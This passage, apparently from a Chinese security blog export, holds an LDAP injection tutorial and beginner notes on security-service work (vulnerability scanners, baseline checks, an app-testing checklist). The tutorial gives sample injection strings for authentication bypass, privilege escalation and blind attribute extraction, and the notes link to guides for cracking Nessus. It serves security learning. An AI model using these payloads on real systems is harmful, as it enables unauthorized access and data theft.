<h4 id="LDAP查询语法"><a href="#LDAP查询语法" class="headerlink" title="LDAP查询语法"></a>LDAP查询语法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设你要树上的一个苹果（一条记录），你怎么告诉园丁它的位置呢？当然首先要说明是哪一棵树（dc，相当于MYSQL的DB），然后是从树根到那个苹果所经过的所有“分叉”（ou），最后就是这个苹果的名字（uid，相当于MySQL表主键id）。好了！这时我们可以清晰的指明这个苹果的位置了，就是那棵“歪脖树”的东边那个分叉上的靠西边那个分叉的再靠北边的分叉上的半红半绿的……，晕了！你直接爬上去吧！</span><br></pre></td></tr></table></figure>

<p>LDAP目录树形结构，存储在叶子节点上：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/1675070455_63d78bf79cd33b1fbaa25.png!small" alt="img" style="zoom:67%;" />

<p>从树根到达目标的位置，可能要经过好几个树杈，所有ou可能有多个值</p>
<p>1、&#x3D;（等于）查询</p>
<p>此 LDAP 参数表明某个属性等于某个值的条件得到满足。例如，如果希望查找“名“属性为“John”的所有对象，可以使用：(givenName&#x3D;John)。</p>
<p>这会返回“名”属性为“John”的所有对象。圆括号是必需的，以便强调 LDAP 语句的开始和结束。</p>
<p>2、&amp;（逻辑与）查询</p>
<p>如果具有多个条件并且希望全部条件都得到满足，则可使用此语法。例如，如果希望查找居住在 Dallas 并且“名”为“John”的所有人员，可以使用：(&amp;(givenName&#x3D;John)(l&#x3D;Dallas))</p>
<p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p>
<p>3、!（逻辑非）查询</p>
<p>此操作符用来排除具有特定属性的对象。假定您需要查找“名”为“John”的对象以外的所有对象。则应使用如下语句：(!givenName&#x3D;John)</p>
<p>此语句将查找“名”不为“John”的所有对象。请注意：! 操作符紧邻参数的前面，并且位于参数的圆括号内。由于本语句只有一个参数，因此使用圆括号将其括起以示说明。</p>
<p>4、（通配符）查询</p>
<p>可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用：(title&#x3D;*)</p>
<p>这会返回“title”属性包含内容的所有对象。另一个例子是：您知道某个对象的“名”属性的开头两个字母是“Jo”。那么，可以使用如下语法进行查找：(givenName&#x3D;Jo*)</p>
<p>这会返回“名”以“Jo”开头的所有对象。</p>
<h4 id="什么是Ldap注入"><a href="#什么是Ldap注入" class="headerlink" title="什么是Ldap注入"></a>什么是Ldap注入</h4><p>原理</p>
<p>LDAP具有特定的查询结构，并具有特定的语法，来对特定目录进行遍历。LDAP注入攻击和SQL注入攻击类似，利用用户引入的参数生成LDAP查询，由于部分参数没有适当的过滤，因此攻击者可以注入恶意代码以造成恶意攻击。</p>
<p>过滤器结构</p>
<p>LDAP同样基于客户端&#x2F;服务器模型，最常见的操作时使用过滤器搜索目录入口。客户端向服务器发送查询，服务器则响应匹配这些过滤器的目录入口。</p>
<p>LDAP过滤器定义于RFC4515中，这些过滤器的结构可概括如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fileter = (filtercomp)</span><br><span class="line">Filtercomp = and / or / not / item</span><br><span class="line">And = &amp; filterlist</span><br><span class="line">Or = | filterlist</span><br><span class="line">Not = ! filter</span><br><span class="line">Filterlist = 1*filter</span><br><span class="line">Item = simple / present / substring</span><br><span class="line">Simple = “=” / “~=” / ”&gt;=” / “&lt;=”</span><br><span class="line">Present = attr =*</span><br><span class="line">Substring = attr “=” [initial]*[final]</span><br><span class="line">Initial = assertion value</span><br><span class="line">Final = assertion value</span><br></pre></td></tr></table></figure>

<p>所有过滤器必须置于括号中，只有简化的逻辑操作符(AND、OR、NOT)和关系操作符(&#x3D;、&gt;&#x3D;、&lt;&#x3D;、~&#x3D;)可用于构造它们。特殊符“*”可用来替换过滤器中的一个或多个字符。</p>
<p>除使用逻辑操作符外，RFC4256还允许使用下面的单独符号作为两个特殊常量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;)     -&gt;Absolute TRUE </span><br><span class="line">(|)     -&gt;Absolute FALSE </span><br></pre></td></tr></table></figure>

<h4 id="Ldap注入详解"><a href="#Ldap注入详解" class="headerlink" title="Ldap注入详解"></a>Ldap注入详解</h4><p>目前使用得最广泛的LDAP：ADAM（不允许有两个过滤器）和OpenLDAP（第二个过滤器会被忽略）。</p>
<p>最简单的思路：</p>
<p>①(attribute&#x3D;value)</p>
<p>如果过滤器用于构造查询单缺少逻辑操作符，如value)(injected_filter的注入会导致两个过滤器(attribute&#x3D;value)(injected_filter)。在OpenLDAP实施中，第二个过滤器会被忽略（即(injected_filter)，起查询作用的是(attribute&#x3D;value)），只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的，因而这个注入毫无用处。</p>
<p>②(|(attribute&#x3D;value)(second_filter)) or (&amp;(attribute&#x3D;value)(second_filter)):如果第一个（注意，这里“第一个”不是指“(|(attribute&#x3D;value)(second_filter))”，而是指注入导致出现两个过滤器的第一个过滤器。如下面“(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)”的“(&amp;(attribute&#x3D;value)(injected_filter))”）用于构造查询的过滤器有逻辑操作符，形如value)(injected_filter)的注入会变成如下过滤器：(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)。虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符（即“(&amp;(attribute&#x3D;value)(injected_filter)) (second_filter)”的“(second_filter)”会被忽略）。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p>
<p>③一些应用框架在将请求发送给服务器之前会检查过滤器是否正确，在这种情况下，过滤器语义上必须是正确的，其注入如：value)(injected_filter))(&amp;(1&#x3D;0。这会导致出现两个不同的过滤器，第二个会被忽略：(&amp;(attribute&#x3D;value)(injected_filter))(&amp;(1&#x3D;0)(second_filter))。</p>
<p>既然第二个过滤器会被LDAP服务器忽略，有些部分便不允许有两个过滤器的查询。这种情况下，只能构建一个特殊的注入以获得单个过滤器的LDAP查询。value)(injected_filter这样的注入产生的结果是：(&amp;(attribute&#x3D;value)(injected_filter)(second_filter))。</p>
<p>测试一个应用是否存在代码注入漏洞典型的方法是向服务器发送会生成一个无效输入的请求，如果服务器返回一个错误消息，那么攻击者就能知道服务器执行了他的查询，他就可以利用代码注入技术来达到攻击的目的。</p>
<p>分为and注入or注入。也可分为盲注有回显两个种类。</p>
<p>详细看这个：<a href="https://www.freebuf.com/vuls/356049.html">Web漏洞那些事儿：LDAP注入 - FreeBuf网络安全行业门户</a></p>
<h4 id="Ldap注入实战"><a href="#Ldap注入实战" class="headerlink" title="Ldap注入实战"></a>Ldap注入实战</h4><p>案例1：绕过访问控制</p>
<p>初始：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER=Uname)(PASSWORD=Pwd)) </span><br></pre></td></tr></table></figure>

<p>我们的输入是Uname、和Pwd</p>
<p>可构造：Uname&#x3D;slisberger)(&amp;))</p>
<p>最后语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER= slisberger)(&amp;))(PASSWORD=Pwd))</span><br></pre></td></tr></table></figure>

<p>LDAP服务器只处理第一个过滤器，即仅查询(&amp;(USER&#x3D;slidberger)(&amp;))得到了处理。这个查询永真，因而攻击者无需有效地密码就能获取对系统的访问(下图)。</p>
<p>案例二：权限提升</p>
<p>现假设下面的查询会向用户列举出所有可见的低安全等级文档：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=document)(security_level=low)) </span><br></pre></td></tr></table></figure>

<p>这里第一个参数document是用户入口，low是第二个参数的值。如果攻击者想列举出所有可见的高安全等级的文档，他可以利用如下的注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document)(security_level=*))(&amp;(directory=documents</span><br></pre></td></tr></table></figure>

<p>生成的过滤器为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure>

<p>LDAP服务器仅会处理第一个过滤器而忽略第二个，因而只有下面的查询会被处理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))</span><br></pre></td></tr></table></figure>

<p>而</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure>

<p>则会被忽略。结果就是，所有安全等级的可用文档都会列举给攻击者，尽管他没有权限查看它们。</p>
<p>案例三：信息泄露</p>
<p>假设一个资源管理器允许用户了解系统中可用的资源(打印机、扫描器、存储系统等)。这便是一个典型的OR注入案例，因为用于展示可用资源的查询为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(|(type=Rsc1)(type=Rsc2))</span><br></pre></td></tr></table></figure>

<p>Rsc1和Rsc2表示系统中不同种类的资源。例如：Rsc1&#x3D;printer，Rsc2&#x3D;scanner用于列出系统中所以可用的打印机和扫描器。</p>
<p>如果攻击者输入Rsc&#x3D;printer)(uid&#x3D;*)，则下面的查询被发送给服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(|(type=printer)(uid=*))(type=scanner)</span><br></pre></td></tr></table></figure>

<p>LDAP服务器会响应所有的打印机和用户对象。</p>
<p>案例四：信息盲注（可以使用字符集消减加快速度*anywhere*）</p>
<p>攻击者可以使用字母、数字搜索提取属性的值，这个想法的关键在于将一个复杂的值转化为TRUE&#x2F;FALSE列表。这个机制，通常称为booleanization，大意是二值化吧，可用于不同的方式。</p>
<p>假设攻击者想知道department属性的值，处理如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、(&amp;(idprinter=HPLaserJet2100)(department=a*))(object=printer))</span><br><span class="line">2、(&amp;(idprinter=HPLaserJet2100)(department=f*))(object=printer))</span><br><span class="line">3、(&amp;(idprinter=HPLaserJet2100)(department=fa*))(object=printer))</span><br></pre></td></tr></table></figure>

<p>本例中department的值是financial，用”a”的尝试没有获取任何打印机信息，因而第一个字母不是”a”。测试过其他字母后，唯一能正常返回的只有”f”，接下来测试第二个字母，当为”i”时才正常返回，以此类推即可获得department的值。</p>
<p>案例五：实战案例：</p>
<p><a href="https://xz.aliyun.com/t/5689">从一次漏洞挖掘入门Ldap注入 - 先知社区 (aliyun.com)</a></p>
<p>案例六：实战案例加代码分析（php）</p>
<p><a href="https://www.anquanke.com/post/id/86899">【漏洞分析】CVE-2017-14596：Joomla! LDAP注入导致登录认证绕过漏洞（含演示视频）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>案例七：pentestlab（php）</p>
<p><a href="https://www.freebuf.com/articles/170322.html">PentesterLab 新手教程（三） ：LDAP攻击 - FreeBuf网络安全行业门户</a></p>
<h4 id="LDAP注入危害"><a href="#LDAP注入危害" class="headerlink" title="LDAP注入危害"></a>LDAP注入危害</h4><p>攻击者可以恶意查询LDAP里面的所有数据，导致非常严重的信息泄露。</p>
<h4 id="LDAP防御"><a href="#LDAP防御" class="headerlink" title="LDAP防御"></a>LDAP防御</h4><p>对特殊字符进行过滤和转义。</p>
]]></content>
      <tags>
        <tag>todo</tag>
      </tags>
  </entry>
  <entry>
    <title>安服基本知识</title>
    <url>/2023/03/15/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="安全服务认知"><a href="#安全服务认知" class="headerlink" title="安全服务认知"></a>安全服务认知</h2><p>keyword：安服项、彩虹计划、解决方案项、安全服务 交付文档规范</p>
<p>tips：不要借安全漏洞做坏事，安服要了解的东西很多</p>
<h3 id="技术类的交互"><a href="#技术类的交互" class="headerlink" title="技术类的交互"></a>技术类的交互</h3><p>给客户做培训类似的</p>
<h3 id="安全测试子类"><a href="#安全测试子类" class="headerlink" title="安全测试子类"></a>安全测试子类</h3><h3 id="咨询服务类"><a href="#咨询服务类" class="headerlink" title="咨询服务类"></a>咨询服务类</h3><p>滴滴被查，数据安全，数据怎么存更安全等。</p>
<p>sdl定义：<a href="https://zhuanlan.zhihu.com/p/252325178">分享|安全开发流程（SDL） - 知乎 (zhihu.com)</a></p>
<h3 id="培训服务类："><a href="#培训服务类：" class="headerlink" title="培训服务类："></a>培训服务类：</h3><p>等级保护对应了解：<a href="https://zhuanlan.zhihu.com/p/349827782">网络安全等级保护分几级？ - 知乎 (zhihu.com)</a></p>
<h3 id="安保服务类"><a href="#安保服务类" class="headerlink" title="安保服务类"></a>安保服务类</h3><h3 id="达到目的"><a href="#达到目的" class="headerlink" title="达到目的"></a>达到目的</h3><h3 id="安全服务要素"><a href="#安全服务要素" class="headerlink" title="安全服务要素"></a>安全服务要素</h3><h3 id="人员分类"><a href="#人员分类" class="headerlink" title="人员分类"></a>人员分类</h3><h3 id="树立网络安全"><a href="#树立网络安全" class="headerlink" title="树立网络安全"></a>树立网络安全</h3><h2 id="漏洞扫描实施"><a href="#漏洞扫描实施" class="headerlink" title="漏洞扫描实施"></a>漏洞扫描实施</h2><h3 id="AWVS使用"><a href="#AWVS使用" class="headerlink" title="AWVS使用"></a>AWVS使用</h3><p>安装参考链接：<a href="https://blog.csdn.net/anlr2020/article/details/118484169">AWVS14.1.2下载安装教程（2021.3.6版本）_awvs下载与安装_an1r的博客-CSDN博客</a></p>
<h4 id="基本设置"><a href="#基本设置" class="headerlink" title="基本设置"></a>基本设置</h4><p>在右上角进行设置，可以设置language为简体，看起来更加舒服</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316161733365.png" alt="image-20230316161733365"></p>
<p>左边显示的是菜单，因为刚刚开始用不是很熟练，就简单学下前面几个怎么使用：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316161943793.png"></p>
<h4 id="仪表盘"><a href="#仪表盘" class="headerlink" title="仪表盘"></a>仪表盘</h4><p>可以显示当前进行的扫描的进度，以及发现的漏洞的数量等</p>
<p>界面形如：<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162415536.png" alt="image-20230316162415536"></p>
<p>要看具体的漏洞，可以点击左边的扫描具体的看。</p>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162701525.png" alt="image-20230316162701525"></p>
<p>分为单个目标，多个目标，目标组</p>
<p>单个目标扫描一个目标，多个目标可以扫描多个目标。</p>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>显示对应的漏洞，具体看图</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162926643.png" alt="image-20230316162926643"></p>
<h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p>个人感觉最重要的一个tab</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316163005526.png" alt="image-20230316163005526"></p>
<p>可以看目标的状态，也可以新建扫描，可以看到扫的漏洞个数。</p>
<p>点击对应的url可以进入下面的界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316163210196.png" alt="image-20230316163210196"></p>
<p>上面圈的可以更加详细的看到对应漏洞及说明，以及扫描出来的网页结构等。</p>
<h4 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h4><p>可以在扫描出生成报告，也可以在此次生成报告，报告种类很多种，暂时还不清楚不同报告类型的差别。</p>
<h3 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h3><h4 id="安装参考链接"><a href="#安装参考链接" class="headerlink" title="安装参考链接"></a>安装参考链接</h4><p><a href="https://www.52pojie.cn/thread-1650667-1-1.html">最详细破解nessus(windows)教程 插件更新至20220613 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.cnblogs.com/Cl0ud/p/13364718.html">Nessus破解没有Scan选项的解决办法 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
<p>上面两个按照顺序弄即可弄好。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230317085903303.png" alt="image-20230317085903303"></p>
<p>然后就可以开始使用了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/smli_ng/article/details/105976795</span><br><span class="line">https://zhuanlan.zhihu.com/p/464866605</span><br><span class="line"></span><br><span class="line">https://www.iculture.cc/software/pig=25546</span><br></pre></td></tr></table></figure>

<h3 id="明鉴扫描系统："><a href="#明鉴扫描系统：" class="headerlink" title="明鉴扫描系统："></a>明鉴扫描系统：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tool.chacuo.net/cryptaes</span><br><span class="line">aes ECB</span><br><span class="line">产品位置：RCwMiXieqCuESTnXAJRat5cujmQTZHAM6RY0Aufkhu7NAt3rsdWc0Nd0eWUIrxho</span><br><span class="line">明鉴系统镜像位置：RCwMiXieqCuESTnXAJRat5cujmQTZHAM6RY0Aufkhu4ylpJP8AtXUNvXEmb4QM4cEXYVygezOCuwuIoV6wXlIM09YaSGPyd7BiNkp+LGmHS3MEy6hvwp6BJdJbnWirhrurgxHKgWFFu5CkRPOFYssA==</span><br></pre></td></tr></table></figure>

<p><a href="https://bbs.dbappsecurity.com.cn/ahproduct">安恒产品 (dbappsecurity.com.cn)</a></p>
<p><a href="https://bbs.dbappsecurity.com.cn/productDetail?detailId=1636194071329329154&productType=download">明鉴漏洞扫描系统-V5.0R01C00SPC104-qcow2格式镜像 (dbappsecurity.com.cn)</a></p>
<p>扫描选桥接模式</p>
<h2 id="基线核查"><a href="#基线核查" class="headerlink" title="基线核查"></a>基线核查</h2><h3 id="基线核查流程"><a href="#基线核查流程" class="headerlink" title="基线核查流程"></a>基线核查流程</h3><p>前期：信息收集。<br>中期：实施阶段。现场检查。<br>后期：报告编写。</p>
<p><del>感觉主要是根据报告模板一个一个检查</del></p>
<h3 id="基线核查方式"><a href="#基线核查方式" class="headerlink" title="基线核查方式"></a>基线核查方式</h3><p>检查方式：</p>
<h4 id="基线检查平台（公司内部平台）："><a href="#基线检查平台（公司内部平台）：" class="headerlink" title="基线检查平台（公司内部平台）："></a>基线检查平台（公司内部平台）：</h4><p>登录对应平台下载工具进行使用。</p>
<ul>
<li>下载脚本</li>
<li>看readme，然后执行命令</li>
<li>之前会生成result，新建项目导入之前的result。</li>
<li>可以生成对应报告，然后对报告进行修改。</li>
</ul>
<h4 id="人工检查："><a href="#人工检查：" class="headerlink" title="人工检查："></a>人工检查：</h4><p>根据手册的checklist进行检查</p>
<p>tips：检查数据库类似的东西小心点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主机评估-winodws、linux、AIX、HP-UNIX等</span><br><span class="line">网络设备评估-Cisco、H3C、中兴等</span><br><span class="line">其它设备评估-FTP</span><br><span class="line">数据库评估-Oracle-unix、mysql等</span><br><span class="line">中间件评估-Tomcat、Apache、IIS、Nginx</span><br></pre></td></tr></table></figure>

<h4 id="远程评估系统："><a href="#远程评估系统：" class="headerlink" title="远程评估系统："></a>远程评估系统：</h4><p>略</p>
<h3 id="常见问题及处置"><a href="#常见问题及处置" class="headerlink" title="常见问题及处置"></a>常见问题及处置</h3><p>资产数量大，往往涉及几百台主机。<br>非常规安装，找不到部署目录。<br>输入查询命令，返回为空。<br>软件更新较快，检查版本与客户版本不符合。<br>软件版本差异，部分检查项新版本已无相关配置。发现问题，提出建议后，但软件已无相关配置项。</p>
<h2 id="web安全测试实施"><a href="#web安全测试实施" class="headerlink" title="web安全测试实施"></a>web安全测试实施</h2><p>主要贴图时要清楚</p>
<p>略</p>
<h2 id="互联网敏感信息泄露"><a href="#互联网敏感信息泄露" class="headerlink" title="互联网敏感信息泄露"></a>互联网敏感信息泄露</h2><h3 id="信息资产梳理"><a href="#信息资产梳理" class="headerlink" title="信息资产梳理"></a>信息资产梳理</h3><h4 id="web网站"><a href="#web网站" class="headerlink" title="web网站"></a>web网站</h4><p>子域名收集：挖掘机等</p>
<h4 id="互联网接口（API）"><a href="#互联网接口（API）" class="headerlink" title="互联网接口（API）"></a>互联网接口（API）</h4><p>官方站点搜索<br> 搜索引擎<br> github</p>
<h4 id="APP应用"><a href="#APP应用" class="headerlink" title="APP应用"></a>APP应用</h4><p>官网<br> 安卓&#x2F;IOS应用商店搜索<br> 搜索引擎</p>
<h4 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h4><p>微信搜索：<a href="https://weixin.sogou.com/">搜狗微信搜索_订阅号及文章内容独家收录，一搜即达 (sogou.com)</a><br> 官网<br> 小程序收录平台</p>
<h4 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h4><p>微信搜索<br> 搜狗搜索<br> 官网</p>
<h3 id="信息泄露情况排查"><a href="#信息泄露情况排查" class="headerlink" title="信息泄露情况排查"></a>信息泄露情况排查</h3><h4 id="敏感信息排查"><a href="#敏感信息排查" class="headerlink" title="敏感信息排查"></a>敏感信息排查</h4><p>网络拓扑、账户&#x2F;密码、邮箱：网盘、github</p>
<h4 id="互联网敏感内容排查"><a href="#互联网敏感内容排查" class="headerlink" title="互联网敏感内容排查"></a>互联网敏感内容排查</h4><p>百度文库、招聘网站、招投标网站</p>
<h4 id="源代码泄露排查"><a href="#源代码泄露排查" class="headerlink" title="源代码泄露排查"></a>源代码泄露排查</h4><p>svn、github、csdn</p>
<h2 id="渗透测试实施"><a href="#渗透测试实施" class="headerlink" title="渗透测试实施"></a>渗透测试实施</h2><p>略（报告模板</p>
<h2 id="APP安全测试"><a href="#APP安全测试" class="headerlink" title="APP安全测试"></a>APP安全测试</h2><p>有报告，简单记录下有哪些检查：</p>
<h4 id="客户端环境安全"><a href="#客户端环境安全" class="headerlink" title="客户端环境安全"></a>客户端环境安全</h4><table>
<thead>
<tr>
<th align="center">客户端环境安全</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">安全完整性校验</td>
<td align="center">测试客户端是否存在完整性校验。如果iOS APP客户端未进行完整性校验，攻击者可以通过篡改客户端程序，对普通用户进行钓鱼等攻击。</td>
</tr>
<tr>
<td align="center">反编译保护（可选）</td>
<td align="center">可执行文件可以被反编译。攻击者可通过该问题看到客户端的逻辑。</td>
</tr>
<tr>
<td align="center">日志敏感信息泄露</td>
<td align="center">如果开发人员在日志中打印信息，则可能造成内网ip、用户名、密码、内部链接等敏感信息泄露。</td>
</tr>
<tr>
<td align="center">应用数据存储安全</td>
<td align="center">检查客户端程序本地存储文件，防止账号密码等敏感信息保存在本地，造成敏感信息泄露的风险。</td>
</tr>
<tr>
<td align="center">越狱环境检测</td>
<td align="center">越狱的环境默认是不安全的，是打破了苹果的生态系统的。如果应用未能在运行之初就检测当前系统是否为越狱环境，那么就会存在一定的风险。</td>
</tr>
<tr>
<td align="center">动态调试检测（可选）</td>
<td align="center">若客户端允许动态调试，攻击者可通过对客户端进行加解密分析、业务流程分析等。</td>
</tr>
<tr>
<td align="center">内存敏感信息检测</td>
<td align="center">一些重要数据，会被临时存放在内存里面。通过读取客户端内存，寻找内存中可能存在的敏感信息（卡号、明文密码等）。</td>
</tr>
<tr>
<td align="center">输入记录保护</td>
<td align="center">在系统中安装了键盘记录软件（可以在非越狱状态运行），则使用系统键盘输入的内容易被键盘记录程序记录，导致内容泄露。</td>
</tr>
<tr>
<td align="center">屏幕录像保护</td>
<td align="center">测试通过截图功能，是否可以截到用户密码输入框（登录密码、交易密码等）的明文密码。</td>
</tr>
</tbody></table>
<h3 id="网络通信安全"><a href="#网络通信安全" class="headerlink" title="网络通信安全"></a>网络通信安全</h3><table>
<thead>
<tr>
<th align="center">网络通信安全</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">通信协议安全</td>
<td align="center">APP使用HTTP协议进行通信过程中可能会遭受中间人攻击，威胁数据安全。</td>
</tr>
<tr>
<td align="center">通信数据加密</td>
<td align="center">查看客户端在登录&#x2F;找回密码等关键业务的报文，是否对报文整体，或关键字段进行加密。</td>
</tr>
<tr>
<td align="center">证书强校验检测</td>
<td align="center">验证客户端是否存在忽略服务端证书校验的问题，客户端没有对服务器进行强校验或者没有在校验错误时候对用户进行提示，攻击者可以通过伪造证书对服务器进行攻击。</td>
</tr>
<tr>
<td align="center">软件升级缺陷</td>
<td align="center">程序在进行版本更新的时候，会向服务器请求一个跳转地址，如果修改返回包中的地址，存在钓鱼攻击的风险。</td>
</tr>
</tbody></table>
<h3 id="安全策略检测"><a href="#安全策略检测" class="headerlink" title="安全策略检测"></a>安全策略检测</h3><table>
<thead>
<tr>
<th align="center">安全策略检测</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">软键盘随机化排布</td>
<td align="center">在用户输入敏感信息时，如果系统未使用自定义软键盘，而是使用了系统自带键盘，或者自定义软键盘未随机，那么恶意程序就可能对屏幕点击进行劫持，导致用户敏感信息泄露。</td>
</tr>
<tr>
<td align="center">后台背景模糊</td>
<td align="center">在切换至多任务状态栏时，APP背景内容是否模糊处理，防止敏感信息泄露。</td>
</tr>
<tr>
<td align="center">手势密码检测</td>
<td align="center">检测APP内手势密码的复杂度要求，手势密码修改是否需要校验密码，本地是否存储了明文手势密码的信息等。</td>
</tr>
<tr>
<td align="center">密码修改验证</td>
<td align="center">检测是否需要输入旧密码验证来修改密码。</td>
</tr>
<tr>
<td align="center">密码复杂度检验</td>
<td align="center">通常客户端没有设置禁止修改口令的强弱判断，导致用户有时贪图方便修改成简单密钥使攻击者容易通过弱口令进入帐号进行非法操作。</td>
</tr>
<tr>
<td align="center">认证失败锁定</td>
<td align="center">测试账户在登录时候多次输入密码错误或修改密码时候多次错误是否会导致账号被锁定。</td>
</tr>
<tr>
<td align="center">UI敏感信息安全</td>
<td align="center">登录过程中会为了友好，提示“用户名错误”或者“密码错误”。此时就可以通过这种“友好”的提示检查项目是否存在相关用户名，并且在账号体系不存在锁定的情况下相对容易地进行密码爆破。</td>
</tr>
<tr>
<td align="center">信息屏蔽检测</td>
<td align="center">检测程序中显示敏感信息是否使用 * 进行部分屏蔽，防止在被截屏获取敏感信息，同时也防止他人窥探手机屏幕得到敏感信息。</td>
</tr>
<tr>
<td align="center">会话超时策略</td>
<td align="center">程序在长时间不操作时候或者在长时间，若程序没有自动锁定或者退出登录，则有可能导致在这种情况下造成数据窃取。</td>
</tr>
<tr>
<td align="center">会话固定风险</td>
<td align="center">程序在进行正常退出之后如果后台不消除相关的用户身份凭证，则在身份凭证被窃取之后容易造成会话固定问题。</td>
</tr>
<tr>
<td align="center">锁屏与会话锁定策略</td>
<td align="center">测试程序在锁屏解锁之后是否会进行会话锁定，并在重新解锁之后要求用户重新进行身份验证。</td>
</tr>
<tr>
<td align="center">TLS&#x2F;SSL协议与加密套件</td>
<td align="center">程序在进行正常退出之后如果后台不消除相关的用户身份凭证，则在身份凭证被窃取之后容易造成会话固定问题。</td>
</tr>
</tbody></table>
<h2 id="威胁分析与处置"><a href="#威胁分析与处置" class="headerlink" title="威胁分析与处置"></a>威胁分析与处置</h2><p>主要解释了平台怎么使用。</p>
<p>APT：高级持续性威胁（Advanced Persistent Threat，APT），又叫高级长期威胁，是一种复杂的、持续的网络攻击，包含三个要素：高级、长期、威胁。高级是指执行APT攻击需要比传统攻击更高的定制程度和复杂程度，需要花费大量时间和资源来研究确定系统内部的漏洞；长期是为了达到特定目的，过程中“放长线”，持续监控目标，对目标保有长期的访问权；威胁强调的是人为参与策划的攻击，攻击目标是高价值的组织，攻击一旦得手，往往会给攻击目标造成巨大的经济损失或政治影响，乃至于毁灭性打击。</p>
<p>参考：<a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81.html</a></p>
<p><a href="https://www.zhihu.com/question/28881041">https://www.zhihu.com/question/28881041</a></p>
<h2 id="应急响应分析"><a href="#应急响应分析" class="headerlink" title="应急响应分析"></a>应急响应分析</h2><p>视频包括模板介绍及案例分析</p>
<p><a href="https://bypass007.github.io/Emergency-Response-Notes/">前言 · 应急响应实战笔记 (bypass007.github.io)</a>  这个说得特别详细</p>
<p>下面是部分介绍应急响应的链接：</p>
<p><a href="https://www.freebuf.com/articles/terminal/192859.html">https://www.freebuf.com/articles/terminal/192859.html</a></p>
<p><a href="https://www.cnblogs.com/fox-yu/p/14380849.html">https://www.cnblogs.com/fox-yu/p/14380849.html</a></p>
<p><a href="https://www.freebuf.com/column/206886.html">应急响应实战案例分享 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.freebuf.com/column/206886.html">应急响应实战案例分享 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/weixin_40412037/article/details/114282426">一次真实的应急响应案例——篡改页面、挖矿(sysupdate、networkservice)（含靶场环境）_应急响应靶场_W小哥1的博客-CSDN博客</a></p>
